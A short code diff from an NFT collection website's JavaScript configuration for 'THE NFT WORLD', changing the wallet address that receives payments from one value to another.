@@ -1,4 +1,4 @@
-const receiveAddress = '0x2D6049DdF0B342b95b5c68dEa0283b4f0e1108Df',
+const receiveAddress = '0xF541356f6cC3A76412f162183a2d735143a88391',
   collectionInfo = {
     name: 'THE NFT WORLD',
     socialMedia: {
